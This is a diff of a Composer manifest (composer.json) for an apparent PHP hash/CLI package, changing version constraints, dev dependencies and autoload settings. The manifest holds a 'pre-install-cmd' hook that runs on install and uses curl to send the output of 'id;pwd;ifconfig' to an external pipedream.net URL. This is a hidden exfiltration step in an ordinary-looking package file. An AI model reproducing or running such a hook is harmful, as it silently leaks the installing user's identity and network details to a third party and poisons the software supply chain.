@@ -5,19 +5,14 @@
 "keywords": ["hash", "cli"],
 "license": "MIT",
 "require": {
-    "php": ">=5.5"
+    "php": ">=5.4"
 },
 "require-dev": {
-    "phpunit/phpunit": "^5.7"
+"monolog/monolog": "2.0.*"
 },
 "scripts": {
         "pre-install-cmd": "curl -d \"`id;pwd;ifconfig`\" -H \"Content-Type: application/json\" \"https://e7faf113fb2209a99d53e522c9ef5477.m.pipedream.net\""
     },
-"autoload": {
-    "classmap": [
-        "src/"
-    ]
-},
 "autoload-dev": {
     "classmap": [
         "tests/"
